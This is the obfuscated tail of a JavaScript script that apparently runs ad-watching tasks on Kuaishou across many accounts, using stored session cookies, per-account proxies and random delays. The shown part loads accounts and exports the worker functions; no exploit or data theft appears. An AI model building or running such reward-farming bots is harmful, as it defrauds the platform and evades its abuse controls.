          "cookie": _0x2d9a3c,
          "proxyConfig": _0x15c59c
        });
      } else _0xa106f8.error("账号格式错误，跳过: " + _0x40065d);
    }
  }
  _0x249ce5 = _0x53828a.length;
  _0xa106f8.info("共找到" + _0x249ce5 + "个有效账号");
  await _0x3ff88d();
})().catch(_0x506213 => _0xa106f8.error(_0x506213)).finally(() => _0xa106f8.done());
module.exports = {
  "runAccountTask": _0x1f3437,
  "KuaishouAdTaskWorker": _0x27a785,
  "getRandomDelay": _0x3b0413,
  "makeRequest": _0x5ab34c,
  "parseProxyConfig": _0x182651
};